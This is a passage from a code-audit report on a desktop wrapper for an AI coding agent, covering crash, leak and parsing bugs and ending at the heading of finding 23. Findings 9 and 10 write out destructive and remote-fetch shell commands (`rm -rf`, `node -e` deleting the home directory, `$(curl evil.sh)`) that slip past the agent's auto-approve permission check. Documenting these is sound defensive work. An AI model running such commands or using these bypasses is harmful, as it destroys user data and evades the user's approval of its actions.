# Audit findings

Produced by a fan-out audit over nine subsystems, with every finding put to an independent verifier instructed to refute it by default. 80 findings were raised; **56 survived** and 24 were rejected as already-guarded, cosmetic, or wrong.

Severities are the *verifier's* corrected values, not the reporter's. Items marked ✅ were fixed in the same pass that produced this document; the rest are open, and each names the file and line to start from.

| Severity | Count |
|---|---|
| high | 14 |
| medium | 20 |
| low | 22 |
| **fixed** | **15** |

## High

### 1. Static web server registers no 'error' listener — a busy port kills the sidecar with an uncaught exception ✅ **fixed**

`sidecar/index.ts:123` · crash

`server.listen(WEB_PORT, '127.0.0.1', cb)` is called with no `server.on('error', ...)` handler and the wrapping promise (line 122) has no reject path. Node emits `'error'` on the server for EADDRINUSE/EACCES; with no listener the EventEmitter rethrows it as an uncaught exception and the process exits. The port is a fixed 17817 (line 70) and there is no single-instance guard in the shell (grepped shell/src for CreateMutex/ERROR_ALREADY_EXISTS — nothing). The caller at line 1095-1097 is `void (async () => { await startWebServer() })()` with no `.catch`, so nothing can report the failure either.

**Failure scenario.** The user launches a second copy of the app, or any other process holds 127.0.0.1:17817 (a stale sidecar left behind by a hard kill is the common case). The new sidecar dies before `emit('sidecar:ready', ...)` at line 1104, the shell waits on a handshake that never arrives, and the only trace is a stack on stderr.

**Suggested fix.** Attach `server.on('error', reject)` and reject the promise, then catch it in the boot IIFE: log the port conflict and either fall back to an ephemeral port (reporting it via the sidecar:ready payload, which already carries `webPort`) or exit with a diagnosable message.

### 2. TAB_HEALTH answers a single tab entry (always null), so health reconciliation is dead code ✅ **fixed**

`sidecar/index.ts:657` · correctness

The contract declares `tabHealth(): Promise<HealthReport>` (src/shared/clui-contract.ts:58) and the generated shim calls it with no arguments (`tabHealth: function () { return invoke("clui:tab-health"); }`, shell/web/clui-shim.js:104). The handler is `({ tabId }: any) => controlPlane.getTabStatus(tabId) ?? null`. `normalizeArgs` turns the absent payload into `{ tabId: undefined }` via BARE_ARG (sidecar/index.ts:1023), so `getTabStatus(undefined)` misses the registry and the channel returns `null` on every call. `controlPlane.getHealth()` — the method that actually returns a HealthReport, already used by IPC.STATUS at line 656 — is what this channel is supposed to call.

**Failure scenario.** A tab is `running`, the CLI child dies externally. useHealthReconciliation (src/renderer/hooks/useHealthReconciliation.ts:23-24) polls `tabHealth()` every 1.5s, gets `null`, and bails at `if (!health?.tabs ...) return`, so the tab is never unstuck and spins on "running" forever. ControlCenterPanel's Live Monitor (src/renderer/components/ControlCenterPanel.tsx:167-179) likewise reads `health?.tabs` as undefined and permanently reports "Healthy / 0 active tasks" during an active run.

**Suggested fix.** Make the handler `[IPC.TAB_HEALTH]: () => controlPlane.getHealth()` and drop the `[IPC.TAB_HEALTH]: 'tabId'` entry from BARE_ARG (line 1023), or change the contract to `tabHealth(tabId: string)` and fix both renderer callers.

### 3. OPENCLAW_RUN handler destructures `{ args }` while the contract sends `{ action }` — every call runs the bare CLI ✅ **fixed**

`sidecar/index.ts:770` · correctness

The contract sends an action name: `openclawRun: (action) => invoke(IPC.OPENCLAW_RUN, { action })` (src/shared/clui-contract.ts:185), and the generated shim reproduces that payload verbatim. The handler is `({ args }: any) => runCli(Array.isArray(args) ? args.map(String) : [], 60000)`. `args` is always `undefined`, so the ternary always takes the empty-array branch and spawns the CLI with zero arguments. There is no action-name-to-argv mapping anywhere in the sidecar or src/main (grepped for `update_check`, `update_upgrade`, `clawhub_inspect`, `gateway_link_whatsapp_qr` — the only hits are renderer call sites), so even fixing the destructure would not wire it up.

**Failure scenario.** User clicks "Upgrade" in the Control Center → `openclawRun('update_upgrade')` → sidecar runs `openclaw` with no arguments → the CLI prints its usage banner → sessionStore.runOpenclawUpgrade (src/renderer/stores/sessionStore.ts:359-365) shows that usage text as "OpenClaw upgrade completed." while nothing was upgraded. The same silent no-op hits update checks (line 341), the marketplace clawhub inspect/search path (lines 568-575), the entire ControlCenterPanel command palette (ControlCenterPanel.tsx:127) and the WhatsApp QR link in OnboardingPanel.tsx:283.

**Suggested fix.** Destructure `{ action }` and translate the action name to argv in the handler (an explicit `Record<string, string[]>` allowlist keyed by 'update_check' | 'update_upgrade' | 'clawhub_inspect:<name>' | ...), rejecting unknown actions rather than spawning the CLI with an empty argv.

### 4. LIST_SESSIONS returns project directories, not SessionMeta — HistoryPicker throws while rendering

`sidecar/index.ts:900` · crash

The contract declares `listSessions(projectPath?: string): Promise<SessionMeta[]>` (src/shared/clui-contract.ts:72) and SessionMeta is `{ sessionId, slug, firstMessage, lastTimestamp, size }` (src/shared/types.ts:336-342). The handler pushes `{ project: dir, path: full, mtime }` — one entry per project *directory* under each agent data home, with none of the declared fields and no per-session enumeration at all. The `projectPath` argument the contract passes is also ignored.

**Failure scenario.** User opens the history popover with at least one directory under `~/.claude/projects` (or any other agent data home). HistoryPicker renders `{session.firstMessage || session.slug || session.sessionId.substring(0, 8)}` (src/renderer/components/HistoryPicker.tsx:172); all three are `undefined` on the sidecar's shape, so `undefined.substring` throws a TypeError during render and takes the component tree down. `key={session.sessionId}` is also undefined for every row.

**Suggested fix.** Enumerate `*.jsonl` files inside each project directory and return real SessionMeta objects (sessionId from the filename, size/mtime from stat, firstMessage from the first user line), honouring the `projectPath` filter; until then the renderer must not be handed a different shape than the contract declares.

### 5. LOAD_SESSION returns `{ ok, content }` while callers expect SessionLoadMessage[] — resume silently orphans the created tab

`sidecar/index.ts:913` · correctness

The contract declares `loadSession(...): Promise<SessionLoadMessage[]>` (src/shared/clui-contract.ts:73) and sessionStore.resumeSession does `history.map(...)` on the result (src/renderer/stores/sessionStore.ts:654-655). The handler returns `{ ok: true, content: <raw jsonl string> }` — an object with no `.map`, and no JSONL parsing into `{role, content, toolName, timestamp}` records anywhere.

**Failure scenario.** User picks a session to resume. `createTab()` succeeds and allocates a backend tab, then `history.map` throws a TypeError (the `.catch(() => [])` on line 654 only covers promise rejection, not the synchronous throw). Control falls to the catch at sessionStore.ts:680, which builds a local tab via `makeLocalTab()` with a *different* id — so the just-created control-plane tab is leaked, the transcript is empty, and the resumed tab's id does not match any backend tab.

**Suggested fix.** Parse the JSONL in the handler and return `SessionLoadMessage[]` (or `[]` on failure), so the declared array contract holds on both the success and error paths.

### 6. A carriage return landing on a PTY chunk boundary is not treated as an Ink redraw — two frames get merged into one line

`src/main/claude/pty-run-manager.ts:623` · correctness

In the scanner, `\r` at the very end of a chunk (`next === null`) is appended to `lineBuffer` and then never re-examined when the following chunk arrives — the loop restarts at `ci = 0` on the new chunk and only the `\n` branch (line 609) strips a *trailing* `\r`. So the redraw semantics implemented at line 626 (`\r` + printable => reset line) are lost whenever the OS hands the `\r` and the text that follows it in separate reads, which is routine with ConPTY on Windows. The stale frame and the new frame are concatenated with an embedded `\r`, which also survives `stripAnsi` because 0x0D is deliberately excluded from the control-char class at line 57.

**Failure scenario.** Read 1 = `"gateway connected | idle\r"`, read 2 = `"Here is the answer you asked for\n"`. The emitted line is `"gateway connected | idle\rHere is the answer you asked for"`. `isUiChrome` tests `/^gateway\s+connected\s*\|\s*idle\b/i`, which matches the *start* of the merged line, so `_processLine` discards it at line 833 and the real answer never reaches the renderer. The mirror case (`"Answer: 42\r"` + `"gateway connected | idle\n"`) leaks the status bar text plus a literal CR into the assistant message.

**Suggested fix.** Carry the pending-CR state across chunks instead of buffering the byte: keep a `pendingCr` boolean on the closure, and at the top of the next `onData` resolve it against the first character of the new chunk (`\n` => line ending, anything printable => `lineBuffer = ''`).

### 7. Permission prompt is re-detected on every PTY chunk — duplicate permission_request storm and leaked 5-minute timers

`src/main/claude/pty-run-manager.ts:638` · correctness

The partial-line path in `onData` calls `this._checkPermissionInBuffer(requestId, handle, cleaned)` with no phase guard, and `_checkPermissionInBuffer` itself only bails on `openclawTuiMode` (line 1000) — it never checks `permissionPhase`. Detection runs against `[...handle.ptyBuffer.slice(-10), currentLine]`, and nothing ever removes the prompt lines from `ptyBuffer` after a prompt is detected or answered. So (a) while the Ink prompt is on screen, every redraw chunk that leaves a non-empty `lineBuffer` re-detects the same prompt, and (b) 500 ms after the user answers, `permissionPhase` returns to 'idle' (line 1131-1135) and the very next line re-detects it from the still-resident buffer. Each detection emits a fresh `permission_request` with a new `questionId` and assigns `handle.permissionTimeout = setTimeout(...)` at line 1041 *without clearing the previous handle*, so every prior timer leaks and will independently fire at +5 min, writing ESC into the PTY and emitting a '[Permission timed out]' text_chunk.

**Failure scenario.** PTY emits `"Claude wants to use Bash\r\nCommand: ls -la\r\n❯ Allow for this project  Allow once  Deny"` (no trailing newline, as Ink redraws). onData fires once per redraw frame: chunk 1 leaves `lineBuffer = "❯ Allow for this project  Allow once  Deny"` -> detection #1 emits permission_request `pty-perm-…-a1`. Chunk 2 (cursor blink redraw) leaves the same partial line -> detection #2 emits `pty-perm-…-b2` and overwrites `permissionTimeout`, orphaning timer #1. After ~30 redraws the renderer has 30 stacked permission cards and 29 orphaned timers that each fire ESC into the CLI five minutes later.

**Suggested fix.** Guard the call site at line 638 (and the top of `_checkPermissionInBuffer`) with `if (handle.permissionPhase === 'waiting_user' || handle.permissionPhase === 'answered') return`, clear `handle.permissionTimeout` before reassigning it at line 1041, and clear/mark-consumed the `ptyBuffer` window once a prompt has been emitted so the same lines cannot re-trigger detection.

### 8. execThrottled leaks its concurrency slot when execFile throws synchronously, deadlocking all probes ✅ **fixed**

`src/main/cli-probe.ts:85` · leak

`acquireSlot()` increments `activeProbes` (line 41) and `releaseSlot()` is only ever called from inside the execFile callback (line 90). The `execFile(...)` call at line 85 sits unguarded in the promise executor, so any synchronous throw rejects the promise without ever running `releaseSlot()`. `execFile` does throw synchronously in practice — confirmed on this machine for a `.cmd` target (`SYNC THROW: EINVAL spawn EINVAL`), which is exactly what `runtime.ts:72` resolves to on the Windows shim fallback path. After MAX_CONCURRENT_PROBES (2) such calls, `activeProbes` is stuck at 2 forever; every later `acquireSlot()` pushes onto `waiting` (line 45) and is never drained, so the returned promise never settles. `probe()` keeps the entry in `inflight` and its callers (sidecar START, node-status, gateway-status/probe) hang with no error and no timeout.

**Failure scenario.** CLI resolves to `openclaw.cmd`. Two `runCliAsync` calls throw EINVAL synchronously; activeProbes stays at 2. The third call (e.g. Control Center's gateway-status) awaits a promise that is never resolved, so the panel spins forever instead of reporting the failure.

**Suggested fix.** Wrap the execFile call in try/catch inside the executor: on a synchronous throw, call `releaseSlot()` and `resolve({ok:false, stdout:'', stderr: err.message})` so the failure surfaces like any other spawn error.

### 9. Safe-Bash allowlist contains arbitrary-execution commands (node, python, env, xargs, find, sed)

`src/main/hooks/permission-server.ts:56` · security

SAFE_BASH_COMMANDS is described as "clearly read-only" (line 40) but includes interpreters and exec wrappers: `node`/`python`/`python3`/`ruby` (lines 55-56), `env` (line 53), `xargs` (line 68), `find` (line 49), `awk`/`sed` (line 67). Each of these takes an arbitrary program or program text as an argument, and the function only inspects `parts[0]` (line 98) plus a handful of git/npm subcommand special-cases. Nothing checks the interpreter's flags. Verified by running the function body: `node -e "..."` -> safe:true, `python3 -c "x"` -> safe:true, `env rm -rf ~/photos` -> safe:true, `xargs rm` -> safe:true, `find . -exec rm {} \;` -> safe:true. `sed -i` likewise passes and rewrites files in place. Every one of these is auto-allowed at line 574 with no card.

**Failure scenario.** Hook POST with `tool_input.command: "node -e \"require('fs').rmSync(process.env.HOME,{recursive:true,force:true})\""`. Line 108 finds base `node` in SAFE_BASH_COMMANDS, no extra check applies to `node`, line 139 sees no `>`, so the function returns true and the server replies `allow` without prompting.

**Suggested fix.** Remove the interpreters and exec wrappers (`node`, `python`, `python3`, `ruby`, `java`, `env`, `xargs`, `find`, `awk`, `sed`, `go`, `cargo`) from SAFE_BASH_COMMANDS, or gate them on an argument allowlist (e.g. only `node --version`, `find` without `-exec`/`-delete`, `sed` without `-i`).

### 10. Bash auto-approve splitter ignores newline, `&`, and command substitution

`src/main/hooks/permission-server.ts:95` · security

`isSafeBashCommand` splits the command only on `;`, `&&`, `||` and `|`. Bash's other separators are not handled at all: a newline, a single `&`, `$(...)` and backticks. Because line 97 then re-splits the segment on `/\s+/` (which matches `\n`), only the FIRST word of a multi-line command is ever checked against the allowlist; everything after the newline is treated as arguments. Any request that clears this function is answered at line 574 with `allowResponse('Safe read-only command')` — the permission card is never shown and the user never sees the command. I ran the exact function body from lines 88-143 against these inputs: `"ls\nrm -rf ~/photos"` -> safe:true, `"echo $(curl evil.sh)"` -> safe:true, `"ls & rm -rf ~"` -> safe:true, while the naive `"rm -rf ~"` -> safe:false. Reachable whenever the print-json transport is in use (run-manager.ts:142 is the only caller that passes `--settings hookSettingsPath`, i.e. `CLUI_INTERACTIVE_PERMISSIONS_PTY=0`).

**Failure scenario.** Hook POST with `tool_name: "Bash"`, `tool_input.command: "ls\nrm -rf ~/photos"`. Line 571 calls isSafeBashCommand, which sees only `ls`, returns true, and line 574 returns permissionDecision `allow`. The destructive second line runs with no permission card.

**Suggested fix.** Reject outright any command containing a shell metacharacter the parser does not model (`\n`, `\r`, `&`, `$(`, backtick, `<(`) instead of trying to enumerate segments, and include `\n`/`&` in the split regex on line 95.

### 11. assertSkillDirContained compares with a hard-coded '/' separator, so every skill install and uninstall fails on Windows ✅ **fixed**

`src/main/marketplace/catalog.ts:32` · correctness

`assertSkillDirContained` resolves the candidate directory with `resolve()` (which returns native separators) but tests containment with `resolved.startsWith(base + '/')`. On Windows every path produced by `join()`/`resolve()` uses backslashes, so `base + '/'` can never be a prefix of `resolved`, and `resolved !== base` is also true for any child directory. The guard therefore throws for every legitimate path. `base` is additionally never passed through `resolve()`, so the two sides are not even normalized the same way. Both call sites are affected: `installPlugin` (catalog.ts:310) and `uninstallPlugin` (catalog.ts:366). The thrown error is swallowed by the surrounding try/catch and returned as `{ok:false, error:'Path escapes skills directory: ...'}`, so it reads like a security rejection rather than a platform bug. The renderer makes it worse: `uninstallMarketplacePlugin` at src/renderer/stores/sessionStore.ts:601 only acts `if (result.ok)`, so a failed uninstall produces no error, no toast, and no state change — the button simply does nothing.

**Failure scenario.** On Windows, getPrimaryAgentHome() returns 'C:\\Users\\x\\.openclaw'. skillsBase = 'C:\\Users\\x\\.openclaw\\skills'; skillsDir = 'C:\\Users\\x\\.openclaw\\skills\\pdf'. resolve(skillsDir) === 'C:\\Users\\x\\.openclaw\\skills\\pdf', which does not start with 'C:\\Users\\x\\.openclaw\\skills/' and is not equal to base, so the function throws. Clicking Uninstall on any installed skill silently no-ops; the SKILL.md install path returns 'Invalid'/'Path escapes' for every plugin.

**Suggested fix.** Compare on normalized, resolved paths using the platform separator, e.g. `const b = resolve(base); const r = resolve(skillsDir); const rel = relative(b, r); if (rel !== '' && (rel.startsWith('..') || isAbsolute(rel))) throw ...`. Also surface `result.error` in sessionStore.uninstallMarketplacePlugin instead of dropping the failure.

### 12. Windows shim resolution prefers .cmd, which Node refuses to spawn without shell:true

`src/main/openclaw/runtime.ts:72` · crash

`shimNames` returns `[name.cmd, name.ps1, name.exe, name]` on Windows even though the comment two lines above says .cmd "is a last resort only". `findShim` (line 75) returns the first hit and `isExecutable` only checks `F_OK` on Windows (line 39), so a normal npm global install resolves to `openclaw.cmd`. When `findPackageEntry` fails (any non-standard install layout — pnpm/bun/volta/scoop, or a `bin` map the loop cannot read), `resolveKind` falls through to the shim branch at line 167 and `CliRuntime.command` becomes that `.cmd`. Since the CVE-2024-27980 fix, Node throws EINVAL *synchronously* for a `.bat`/`.cmd` target without `shell: true` — I confirmed on this machine: `execFile('C:\\nope\\openclaw.cmd', ...)` -> `SYNC THROW: EINVAL spawn EINVAL`. `.ps1` is not spawnable either. So the fallback path resolves to a command that `cli-probe.ts:85`, `run-manager.ts:178` and `agent-run-manager.ts:240` can never launch.

**Failure scenario.** On Windows with the CLI installed such that `%APPDATA%\npm\node_modules\openclaw\package.json` is absent, getCliRuntime() returns command=`...\openclaw.cmd`; every runCliAsync/startRun then throws EINVAL synchronously instead of running the CLI.

**Suggested fix.** Order the candidates `.exe`, then `.cmd`/`.ps1` only when the caller can pass `shell: true`; or keep `.cmd` but have the spawn sites set `shell: true` (with argument quoting) when `command` ends in `.cmd`/`.bat`.

### 13. process.cwd() called in the renderer — ReferenceError blanks the whole app ✅ **fixed**

`src/renderer/components/ConversationView.tsx:461` · crash

`projectPath={staticInfo?.projectPath || process.cwd()}` evaluates `process.cwd()` in browser code. This is no longer Electron with nodeIntegration — the renderer is plain HTML served over loopback by the sidecar. `vite.config.ts` has no `define` for `process`, `src/renderer/index.html` has no polyfill, and `shell/web/clui-shim.js` never defines a `process` global. `src/renderer/hooks/useShortcuts.ts:7` even documents the constraint: the renderer cannot read `process.*`, which is why `platform` is shipped over IPC. This is the only runtime `process.*` reference in `src/renderer/`. Because `main.tsx` mounts `<App/>` with no error boundary, a throw here unmounts the entire React tree and leaves a blank launcher window.

**Failure scenario.** `window.clui.start()` rejects (sidecar not ready / CLI probe failure), so `initStaticInfo`'s `try { apply(await window.clui.start()) } catch {}` at sessionStore.ts:265-268 swallows it and `staticInfo` stays `null`. The user still sends a prompt (sendMessage falls back to `'~'` at sessionStore.ts:823), the run hits a denied tool, and `tab.permissionDenied` becomes truthy. ConversationView then renders line 461: `staticInfo?.projectPath` is `undefined`, so `process.cwd()` runs -> `ReferenceError: process is not defined` -> React unmounts the root -> blank window with no recovery.

**Suggested fix.** Drop the Node fallback entirely and use a renderer-safe default, e.g. `projectPath={staticInfo?.projectPath || tab.workingDirectory || '~'}`. `tab.workingDirectory` is always populated by `makeLocalTab()`.

### 14. validateTheme accepts themes with no branding/effects/typography, and the renderer dereferences them unguarded

`src/shared/theme-types.ts:120` · crash

`validateTheme` (theme-types.ts:96-121) only checks `id`, `name`, and the ten seed strings in `dark` and `light`. It never checks `branding`, `effects` or `typography`, yet returns `{ ok: true, theme: candidate as Theme }`. I verified this at runtime: `validateTheme({id:'x',name:'X',dark,light})` returns `ok: true`. Both entry points trust that result and make the theme ACTIVE: `upsertCustomTheme` (theme.ts:603-609, reached from AppearancePanel.tsx:75-79 `importTheme`) and `loadSettings` (theme.ts:500-505, which re-validates localStorage on every boot). Consumers then dereference the missing fields with no optional chaining: AppearancePanel.tsx:177/183/190 read `theme.effects.radius|glow|blur`; AppearancePanel.tsx:353 and 375 read `theme.branding.glyph|tagline` for EVERY card in `allThemes` (line 82), so a bad theme breaks the panel even when it is not selected; `useBranding()` (theme.ts:704) feeds InputBar.tsx:442-443/500-501 and ConversationView.tsx:170/574, which read `.assistantName`, `.inputPlaceholder` and `.greeting` off it. There is no React error boundary anywhere in src/renderer (grep for ErrorBoundary/componentDidCatch/getDerivedStateFromError returns nothing), so an uncaught render throw unmounts the whole tree in React 19 and the launcher goes blank. Note that theme.ts:559-566 does guard `s.theme.branding.appName` inside a try/catch, showing the hazard was known at one call site but not the others.

**Failure scenario.** A user hand-writes or trims a theme JSON — e.g. `{"id":"mine","name":"Mine","dark":{...10 seeds...},"light":{...10 seeds...}}` — and clicks Import in the Appearance panel. validateTheme returns ok, `upsertCustomTheme` stores it and calls `commit({theme: custom})`, making it the active theme. The very next render of InputBar hits `branding.inputPlaceholder` on `undefined` and throws `TypeError: Cannot read properties of undefined (reading 'inputPlaceholder')`; with no error boundary the entire launcher unmounts to a blank window. Worse, the broken theme is persisted to localStorage by the same `commit`, and `loadSettings` re-validates it as ok on the next launch, so the app is bricked on every subsequent start until localStorage is cleared by hand. The same crash reaches AppearancePanel.tsx:177 (`theme.effects.radius`) for a theme with no `effects`.

**Suggested fix.** Extend validateTheme to require and normalize the rest of the contract before returning ok: check `branding` is an object with string `appName/assistantName/tagline/greeting/inputPlaceholder/glyph`, `typography` with string `sans/mono`, and `effects` with finite numeric `radius/glow/blur` — or, better, fill missing sub-objects from the default preset and return the completed theme, so partial hand-written files still import cleanly. Since the function already returns a discriminated result, returning `{ok:false, error:'Missing branding.appName'}` is consistent with the existing style.

## Medium

### 15. OPENCLAW_SET_MODEL drops the provider, so the selection cannot round-trip through OPENCLAW_MODEL_INFO

`sidecar/index.ts:762` · correctness

The contract sends `{ provider, model }` (src/shared/clui-contract.ts:184) and every caller passes a bare model id as the second argument (`setOpenclawModel(activeProvider, m.id)` — StatusBar.tsx:135, InputBar.tsx:273, ControlCenterPanel.tsx:457). The handler destructures only `{ model }` and runs `config set model <bare id>`. Both readers of the stored value parse it as `provider/model`: `_fetchGatewayModelInfoUncached` at lines 337-345 and the local branch at lines 750-758 require `primary.includes('/')` before they resolve anything.

**Failure scenario.** User picks provider `anthropic`, model `claude-sonnet-4`. The sidecar writes `claude-sonnet-4` with no provider prefix. On the next OPENCLAW_MODEL_INFO the `primary.includes('/')` test fails, so both `provider` and `model` come back null and the picker renders as though nothing is selected — while the optimistic local state set at sessionStore.ts:318-324 still shows the chosen model until the next refresh.

**Suggested fix.** Destructure `{ provider, model }` and pass the qualified id: `runCli(['config', 'set', 'model', `${provider}/${model}`])`, rejecting the call when `provider` is missing.

### 16. Permission run token and its temp settings file leak when startRun throws

`src/main/claude/control-plane.ts:845` · leak

`_dispatch` calls `permissionServer.registerRun(...)` and `permissionServer.generateSettingsFile(runToken)` at lines 807-812, storing the token in `this.runTokens`. `generateSettingsFile` (permission-server.ts:431-460) writes `%TEMP%/clui-hook-config/clui-hook-<runToken>.json` and records it in `settingsFiles`. Every cleanup of that pair lives in the transport exit/error handlers (lines 199-203, 351-355, 501-505, 559-563), which only run if a child process actually started. The `catch` at lines 845-851 rolls back `activeRequestId`/`runPid`/status and rethrows, but never calls `this.permissionServer.unregisterRun(runToken)` or `this.runTokens.delete(requestId)`. PtyRunManager's `pty.spawn` throws synchronously when the CLI cannot be launched, which is the default transport for the Claude CLI (sidecar/index.ts:132-133 makes `interactivePty` default to true), so this path is reachable. Compounding it: if the same requestId is later retried (`IPC.RETRY` at sidecar/index.ts:648 forwards a caller-supplied requestId), line 809 overwrites `this.runTokens[requestId]` with a new token, so the stale token can never be unregistered by any later handler either.

**Failure scenario.** The CLI binary is missing or not executable. User sends a prompt; `this.ptyRunManager.startRun(...)` (line 837) throws. The catch rethrows, so the renderer sees a failure — but `runTokens` keeps a requestId->token entry forever, `permissionServer.runTokens` keeps the registration, and a 0600 JSON file containing a live `http://127.0.0.1:<port>/hook/pre-tool-use/<appSecret>/<runToken>` URL is left in the temp directory. Retrying N times leaves N registrations and N files; the hook URLs stay valid for the whole process lifetime. `permissionServer.stop()` only unlinks the files at shutdown, and the in-memory maps grow unbounded until then.

**Suggested fix.** In the catch at line 845, before rethrowing: `const t = this.runTokens.get(requestId); if (t) { this.permissionServer.unregisterRun(t); this.runTokens.delete(requestId) }`. Separately, unregister any pre-existing token at line 809 before overwriting the map entry. (Note the agent transport ignores `hookSettingsPath` entirely — `agent-run-manager.ts:_buildArgs` lines 223-230 never passes it — so for the default OpenClaw path this file is written and leaked for no benefit at all.)

### 17. detectPermissionPrompt fires on ordinary prose — four keywords alone reach the confidence threshold

`src/main/claude/pty-run-manager.ts:139` · correctness

`confidence` is incremented by 1 for each of the five independent keyword regexes (`allow`, `deny`, `reject`, `permission`, `approve`, lines 122-131) and the gate is `if (confidence < 4) return null`. No structural evidence (a tool match or an option row) is required, so any 11-line window of assistant text that mentions four of those five words is classified as a permission prompt. When that happens `_processLine` sets `permissionPhase = 'waiting_user'` and returns at line 806 for every subsequent line, so the rest of the answer is silently discarded until the user clicks a fabricated option — and `respondToPermission` then writes 'n' or '\r' into the CLI's message box (there is no real selector to drive), injecting junk into the session.

**Failure scenario.** Claude answers a question about its own permission model and prints the line `You can allow or deny it, or approve the permission later.` -> allow +1, deny +1, permission +1, approve +1 = 4 >= 4. `toolMatch` is null so `toolName` becomes 'Unknown'; the option patterns `/(?:^|\s)Allow(?:\s|$)/i` and `/\bDeny\b/i` both hit, so a bogus permission_request with Allow/Deny options is emitted, the transcript freezes, and answering it types a stray character into the live CLI.

**Suggested fix.** Require structural evidence, not keyword count: only declare a prompt when a tool match OR an option row (`hasOptions`) is present, e.g. `if (!toolMatch && !hasOptions) return null` before the threshold test, and raise the keyword weight cap so prose cannot reach the threshold on its own.

### 18. isUiChrome substring-matches 'thinking'/'processing' anywhere in a line and deletes real sentences ✅ **fixed**

`src/main/claude/pty-run-manager.ts:241` · correctness

`if (/zigzagging|thinking|processing|nebulizing|Boondoggling/i.test(cleaned)) return true` is an unanchored, case-insensitive substring test intended to catch spinner verbs, but it classifies any content line containing those words as chrome. `_processLine` then drops the line outright at line 833. The same over-broad style affects line 236 (`/\/mcp|MCP server/i`) and line 249 (`/settings?\s*issue|\/doctor/i`), which eat any line mentioning an MCP server or containing the substring `/doctor` in a file path.

**Failure scenario.** The agent answers `Processing happens on the worker thread, so the UI stays responsive.` — the line matches `processing` and is discarded, leaving a hole in the middle of the response with no indication anything was removed. Same for `I moved the check into src/doctor/index.ts` (matches `/doctor`) and `The MCP server config lives in openclaw.json` (matches `MCP server`).

**Suggested fix.** Anchor the spinner patterns to the line start together with a spinner glyph or ellipsis (e.g. `/^(?:[⠋-⠿✢✳✶✻✽]\s*)?(?:thinking|processing|zigzagging|nebulizing|boondoggling)[….]*$/i`) instead of testing for the word anywhere in the line.

### 19. parseToolCallLine treats prose beginning with 'Running'/'Executing' or '✓' as a tool call, deleting the line

`src/main/claude/pty-run-manager.ts:338` · correctness

`/^\s*(?:⏳|✓|✗|⚡|🔧|Running|Executing)\s+([A-Za-z_][\w-]*)\s*(.*)$/i` matches any line whose first word is Running/Executing (case-insensitive) or which starts with a check/cross glyph, and captures the *second* word as the tool name. In `_processLine` a match increments `toolCallCount`, emits a `tool_call` event plus a delayed `tool_call_complete`, and then `return`s at line 829 — so the text of that line never reaches the accumulator.

**Failure scenario.** Assistant writes `Running the test suite takes about three minutes.` -> parsed as `{toolName: 'the', input: 'test suite takes about three minutes.'}`. The renderer adds a tool card labelled `Running the...` (sessionStore `tool_call` case) and the sentence disappears from the answer. `✓ Done — all 42 tests passed` behaves the same way, producing a tool card named `Done`.

**Suggested fix.** Require the tool-name token to be one of the known tool names (or at least Capitalized and followed by a recognisable argument shape), and drop the bare `Running|Executing` word alternatives, keeping only the glyph-prefixed forms.

### 20. Consecutive-duplicate suppression runs on trimmed lines and deletes real repeated content such as closing braces

`src/main/claude/pty-run-manager.ts:729` · correctness

Line 692 trims each line (`stripAnsi(rawLine).trim()`), destroying indentation, and line 729 then drops any line equal to the previous one: `if (handle.ptyBuffer.length > 0 && handle.ptyBuffer[handle.ptyBuffer.length - 1] === cleaned) return`. Because indentation is already gone, structurally distinct lines become identical strings, so legitimate repeated output is silently deleted before it ever reaches the text accumulator. This applies to both transports (it is above the `openclawTuiMode` checks).

**Failure scenario.** The agent prints a code block:
```
function f() {
  if (x) {
    g()
  }
}
```
After trimming, the last two lines are both `}` and are consecutive, so the second one is dropped at line 729. The user is shown code with an unbalanced brace. Any repeated line — `}`, `]`, `--`, a blank-equivalent separator, two identical rows of a generated table — is silently lost.

**Suggested fix.** Deduplicate on the raw (untrimmed) line, or restrict the guard to lines classified as UI chrome/status redraws instead of applying it to all content.

### 21. ~/.clui-debug.log is appended by four modules with no rotation or size cap, and every PTY output line is written synchronously

`src/main/claude/pty-run-manager.ts:739` · leak

`~/.clui-debug.log` is written by src/main/logger.ts:5, src/main/skills/installer.ts:54, src/main/process-manager.ts:11 and src/main/claude/pty-run-manager.ts:35. A grep across src/ for rotate/truncate/statSync/maxSize turns up nothing — no writer checks the file size, truncates, rolls, or prunes. The dominant writer is pty-run-manager.ts:739, which logs up to 200 characters for every de-duplicated line of PTY output, unconditionally and with no debug-mode gate, for the entire lifetime of every agent run. It uses `appendFileSync` (line 43), a blocking write on the sidecar's event loop — the same loop the installer's own comment at installer.ts:110-113 explicitly warns must not be blocked because it carries the whole NDJSON protocol to the renderer. A TUI that repaints continuously produces hundreds of lines per second, each costing an open/write/close syscall inline with protocol dispatch.

**Failure scenario.** A user runs the app daily for a few months with long agent sessions. ~/.clui-debug.log grows to hundreds of megabytes or gigabytes and is never trimmed; nothing in the app ever reduces it. During a verbose TUI repaint burst, the synchronous appendFileSync per line stalls the sidecar event loop, delaying every window.clui channel response behind it.

**Suggested fix.** Route all four modules through the single buffered logger in src/main/logger.ts, add size-based rotation there (stat on open, rename to .1 past a cap such as 10 MB, keep one or two generations), and gate the per-PTY-line log at pty-run-manager.ts:739 behind an opt-in debug flag.

### 22. OpenClaw echo gate discards 100% of output when the prompt normalizes to an empty key or wraps across terminal lines

`src/main/claude/pty-run-manager.ts:766` · correctness

`promptKey` is built by `normalizeForMatch`, which keeps only `[a-z0-9]` after `toLowerCase()` (line 67) and collapses everything else to single spaces. Any prompt without ASCII alphanumerics normalizes to the empty string, and line 766 (`if (!handle.promptKey) return`) then rejects every single line for the life of the run, so `pastInit` is never set. The same total-loss path is hit by line 769 (`if (idx === -1) return`) because the key is matched with `norm.lastIndexOf` against one *single* cleaned line, while the PTY is spawned with `cols: 120` (line 527) — any prompt whose last line exceeds the usable width is hard-wrapped by the child renderer and can never be found in one line. With `pastInit` false, `_checkQuiescenceCompletion` also returns immediately at line 905, so the run cannot even complete on its own.

**Failure scenario.** Prompt = `こんにちは` (or any CJK/emoji-only prompt): `normalizeForMatch` produces `norm === ''` because the space branch is skipped while `norm.length === 0`, so `promptKey === ''` and every line returns at line 766. Nothing is ever emitted; on PTY exit `_emitTerminal` sees `!seenContent` with `gatewayState === 'unknown'` and reports `"No response from the agent gateway. Check the gateway connection in Control Center."` for a run that actually succeeded. Same outcome for an ASCII prompt of 200 characters, which the 120-column PTY wraps into two lines so `lastIndexOf` never matches.

**Suggested fix.** Fall back to a time/marker-based `pastInit` when `promptKey` is empty or has not matched within N lines, and match the key against a joined sliding window of the last few cleaned lines (with wrap-induced line breaks removed) rather than a single line.

### 23. Appending `2>&1` disables the write-redirection guard entirely

